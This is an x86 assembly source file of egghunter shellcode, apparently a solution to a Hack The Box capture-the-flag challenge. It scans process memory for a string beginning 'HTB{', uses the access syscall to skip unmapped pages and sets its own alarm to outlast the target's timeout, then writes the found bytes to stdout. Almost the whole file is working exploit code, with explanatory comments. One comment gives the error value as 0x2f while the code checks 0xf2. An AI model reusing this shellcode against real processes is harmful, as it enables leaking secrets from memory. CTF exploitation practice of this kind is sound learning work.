;compile with:
; python /home/purple/Documents/binaryExploitation/shellcode_utilities/makeasm.py 32 clean shellcode.asm

global _start

section .text

; This shellcode is like typical egghunter shellcode, but instead of searching
; for our remaining shellcode, we are searching for string that starts with HTB{

; We also know from the binary that the string will be placed somewhere in the address
; range 0x5FFFFFFF < address <= 0xF7000000

; As we access Virtual Address Space, some of the memory regions are un-allocated
; and thus dangerous to access. To combat this, we can use access(address, mode)
; which is a syscall with eax=0x21

; The rough algorithm for what we are doing with our shellocode is:

; mem_addr = 0x5FFFFFFF
; if access(mem_addr, 0) == 0x2f:
;   jump_to_next_page()
; elif value_at(mem_addr) != egg:
;   mem_addr += 1
; else:
; print(mem_addr)

; We have an additional consideration, which is that this binary makes an alarm() call,
; and will exit after 3 seconds. That may not be enough time to traverse the memory
; We can syscall an alarm of our own. When setting another alarm, the program will
; not call the signal until there are no more alarms left

_start:
    push 60 ; duration for arg1 of alarm()
    pop ebx
    push 0x1b ; alarm syscall
    pop eax
    int 0x80

    mov edi, dword 0x7b425448 ; "HTB{" in little endian
    mov edx, 0x5FFFFFFF ; set start addres to search for the egg

next_page:
    or dx, 0xfff ; dx = 4095. Page sizes in Linux x86 = 4096

next_address:
    inc edx ; edx = 4096
    pusha ; push all of the current general purpose registers
    xor ecx, ecx ; clear arg2
    lea ebx, [edx + 0x4] ; address to be validated for memory violation
    mov al, 0x21 ; access syscall
    int 0x80

    cmp al, 0xf2 ; compare return value, bad address = EFAULT (0xf2)
    popa ; get all the registers back
    jz next_page ; jump to next bage if EFAULT occurs
    cmp [edx], edi ; compare string to egg
    jnz next_address
    
    mov ecx, edx ; assign address of flag to arg2 of write()
    push 36 ; set length of flag to write
    pop edx
    push 0x1 ; set arg1 (fd) as stdout
    pop ebx
    mov al, 0x4 ; write syscall
    int 0x80